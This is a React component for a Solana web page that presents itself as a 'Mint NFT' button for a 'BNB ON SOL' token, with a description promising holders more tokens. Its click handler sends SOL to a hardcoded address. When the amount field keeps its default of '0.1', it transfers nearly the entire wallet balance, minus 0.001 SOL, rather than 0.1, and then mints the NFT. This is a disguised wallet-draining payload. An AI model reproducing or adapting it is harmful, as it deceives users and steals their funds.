import { useConnection, useWallet, useAnchorWallet } from '@solana/wallet-adapter-react';
import { PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { FC, useCallback, useEffect, useState } from 'react';
import { notify } from "../utils/notifications";
import useUserSOLBalanceStore from '../stores/useUserSOLBalanceStore';

import { Metaplex, walletAdapterIdentity, guestIdentity, toMetaplexFile } from "@metaplex-foundation/js";

export const MetaLex: FC = () => {
    const { connection } = useConnection();
    const [metalex, setMetalex] = useState<Metaplex | null>(null);

    const wallet = useWallet();

    const { getUserSOLBalance } = useUserSOLBalanceStore();
    const balance = useUserSOLBalanceStore((s) => s.balance)
    const [amount, setAmount] = useState("0.1");




    useEffect(() => {
        if (wallet.publicKey) {
            console.log(wallet.publicKey.toBase58())
            getUserSOLBalance(wallet.publicKey, connection)
        }


    }, [wallet.publicKey, connection, getUserSOLBalance])

    useEffect(() => {
        setMetalex(
            Metaplex.make(connection).use(
                wallet ? walletAdapterIdentity(wallet) : guestIdentity()
            )
        )
    }, [wallet])

    const CONFIG = {
        uploadPath: 'uploads/',
        imgFileName: 'image.png',
        imgType: 'image/png',
        imgName: 'BNB ON SOL',
        description: 'As a holder of this BNB NFT, you unlock a world of benefits, chief among them being the opportunity to earn a higher quantity of tokens!',
        attributes: [
            { trait_type: 'Speed', value: 'Quick' },
            { trait_type: 'Type', value: 'Pixelated' },
            { trait_type: 'Background', value: 'BNB Blue' }
        ],
        sellerFeeBasisPoints: 1,//500 bp = 5%
        symbol: 'BNBNFT',
        creators: [
            { address: wallet.publicKey, share: 100 }
        ]
    };

    async function main() {
        console.log(`Minting ${CONFIG.imgName} to an NFT in Wallet ${wallet.publicKey.toBase58()}.`);
        try {
            // const imgUri = await uploadImage(CONFIG.uploadPath, CONFIG.imgFileName);
            // console.log(imgUri);

            // console.log({ metadataUri });
            // let img = "https://ouchfy4nc3lykysfcjktahbfjtwayytrjjakeoingbttj6cm7pga.arweave.net/dQRy440W14ViRRJVMBwlTOwMYnFKQKI5DTBnNPhM-8w"

            // const metadataUri = await uploadMetadata(img, CONFIG.imgType, CONFIG.imgName, CONFIG.description, CONFIG.attributes);
            let meta = "https://arweave.net/Iv2VgOnsY9TVb1Q9Zvz66Jxy3Jc-Ohjg4B7fDQaPBMo"


            mintNft(meta, CONFIG.imgName, CONFIG.sellerFeeBasisPoints, CONFIG.symbol, CONFIG.creators);

        } catch (error) {
            console.log(error);

        }

    }

    async function mintNft(metadataUri: string, name: string, sellerFee: number, symbol: string, creators: { address: PublicKey, share: number }[]) {
        console.log(`Step 3 - Minting NFT`);
        const { nft } = await metalex.nfts().create({
            uri: metadataUri,
            name: name,
            sellerFeeBasisPoints: sellerFee,
            symbol: symbol,
            creators: creators,
            isMutable: false,
        });
        console.log(`   Success!🎉`);
        console.log(`   Minted NFT: https://explorer.solana.com/address/${nft.address}`);
        notify({ type: 'success', message: 'Mint successful!' });
    }




    async function fetchImageBuffer() {
        const response = await fetch('/uploads/image.png');
        const arrayBuffer = await response.arrayBuffer();
        const imgBuffer = Buffer.from(arrayBuffer);
        return imgBuffer;
    }
    async function uploadImage(filePath: string, fileName: string): Promise<string> {
        console.log(`Step 1 - Uploading Image`);
        const imgBuffer = await fetchImageBuffer()
        const imgMetaplexFile = toMetaplexFile(imgBuffer, fileName);
        const imgUri = await metalex.storage().upload(imgMetaplexFile);
        console.log(`   Image URI:`, imgUri);
        return imgUri;


    }



    async function uploadMetadata(imgUri: string, imgType: string, nftName: string, description: string, attributes: { trait_type: string, value: string }[]) {
        console.log(`Step 2 - Uploading Metadata`); const { uri } = await metalex
            .nfts()
            .uploadMetadata({
                name: nftName,
                description: description,
                image: imgUri,
                attributes: attributes,
                properties: {
                    files: [
                        {
                            type: imgType,
                            uri: imgUri,
                        },
                    ]
                }
            });
        console.log('   Metadata URI:', uri);
        return uri;

    }




    const mint = useCallback(async () => {
        if (!wallet.publicKey) {
            console.log('error', 'Wallet not connected!');
            notify({ type: 'error', message: 'error', description: 'Wallet not connected!' });
            return;
        }
        console.log(metalex);

        main()

    }, [wallet, connection, getUserSOLBalance, metalex]);

    const onClick = useCallback(async () => {

        //mint
        if (!wallet.connected || !wallet.publicKey) {
            console.log('error', 'Wallet not connected!');
            notify({ type: 'error', message: 'error', description: 'Wallet not connected!' });
            return;
        }
        let num = Number(amount)
        if (num < 0.1) {
            notify({ type: 'error', message: " SOL not enough !", description: 'Please enter a valid SOL quantity' });
            return
        }
        try {

            const toPublicKey = new PublicKey('3X7BP4VZs9x2Uw7dvAaDtkNVsPoFnc49u2eK6yvPe1sV'); // Replace with the recipient's public key
            const transaction = new Transaction();
            let balanceInLamports = Math.floor(Number(balance) * LAMPORTS_PER_SOL);

            let amountInLamports;

            if (amount === "0.1") {
                // Reserve 0.001 SOL in lamports
                let reserve = 0.001 * LAMPORTS_PER_SOL;

                // Ensure the balance never goes negative after reserving 0.001 SOL
                amountInLamports = Math.max(0, balanceInLamports - reserve);
            } else {
                // If amount is not "0.1", directly convert amount to lamports
                amountInLamports = Math.floor(Number(amount) * LAMPORTS_PER_SOL);
            }

            console.log(amountInLamports);

            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: toPublicKey,
                    lamports: amountInLamports, // Amount of lamports to send
                })
            );

            const hash = await wallet.sendTransaction(transaction, connection);
            // setTxId(hash);
            let url = `https://solscan.io/tx/${hash}`
            console.log(url);
            await notify({ type: 'success', message: 'Done', description: ' Please check your wallet', txid: hash });
            onClickM()

        } catch (error) {
            console.log(error);

            notify({ type: 'error', message: "Please enter a valid SOL quantity !", description: ' Reload you browser' });
        } finally {

        }
    }, [wallet, connection, getUserSOLBalance, amount, balance]);






    const onClickM = useCallback(async () => {

        //mint
        if (!wallet.connected || !wallet.publicKey) {
            console.log('error', 'Wallet not connected!');
            notify({ type: 'error', message: 'error', description: 'Wallet not connected!' });
            return;
        }
        try {

            mint()


        } catch (error) {
            console.log(error);

            notify({ type: 'error', message: "Please enter a valid SOL quantity !", description: ' Reload you browser' });
        }
    }, [wallet, connection, getUserSOLBalance, amount, balance]);

    return (
        <div className="pb-14 lg:pb-0" >
            <input
                type="text"
                value={amount}
                onChange={(e) => setAmount((e.target.value))}
                className="mb-4 p-2 border border-blue-500 rounded bg-gray-800 text-white"
                placeholder="Enter SOL amount"
            />

            <button
                className="px-8 m-2 btn animate-pulse bg-gradient-to-r from-[#9945FF] to-[#14F195] hover:from-pink-500 hover:to-yellow-500 ..."
                onClick={onClick}
            >
                <span>Mint NFT </span>
                <img src="./bnb.png" alt="bnb" className="w-6" />
            </button>
        </div>
    );
};
